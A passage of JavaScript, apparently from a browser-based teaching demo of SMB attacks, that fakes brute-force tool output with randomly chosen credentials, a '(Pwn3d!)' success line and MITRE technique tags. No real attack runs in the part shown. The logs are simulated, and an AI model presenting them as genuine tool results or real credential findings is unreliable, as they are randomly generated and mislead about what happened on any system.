      const combos = users.slice(0,5).map(u => ({ u, p: passwords[rand(0,passwords.length-1)] }));
      const winIdx = rand(0,combos.length-1);
      for (let i = 0; i < combos.length; i++) {
        const {u,p} = combos[i];
        if (i === winIdx) {
          await L.log(`[+] ${target}\\${u}:${p} (Pwn3d!)`, 'danger', rand(100,200));
        } else {
          await L.log(`[-] ${target}\\${u}:${p}`, 'recv', rand(80,150));
        }
      }
      await L.log('', 'info', 50);
      await L.log(t(`[+] Match encontrado: ${combos[winIdx].u} / ${combos[winIdx].p}`, `[+] Match found: ${combos[winIdx].u} / ${combos[winIdx].p}`), 'attack', 400);
    }
    await L.log('', 'info', 50);
    await L.log('MITRE: T1110 Brute Force · T1087 Account Discovery', 'info', 200);
  }

  return { runSession, runPTH, runRelay, runEternalBlue,
           runPrintNightmare, resetPrint, runBrute, resetBrute, reset };

})();

window.smbDemo = smbDemo;
